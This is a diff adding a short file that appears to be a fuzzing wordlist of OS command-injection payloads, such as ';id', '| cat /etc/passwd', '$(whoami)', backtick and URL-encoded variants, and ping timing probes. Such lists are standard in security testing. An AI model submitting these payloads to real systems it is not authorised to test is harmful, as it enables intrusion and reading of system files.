@@ -1,0 +1,17 @@
+;id
+; id
+&& id
+&& whoami
+| id
+| whoami
+| cat /etc/passwd
+$(id)
+`id`
+;cat /etc/passwd
+& whoami
+%3Bid
+%26%26 id
+$(whoami)
+`whoami`
+;ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
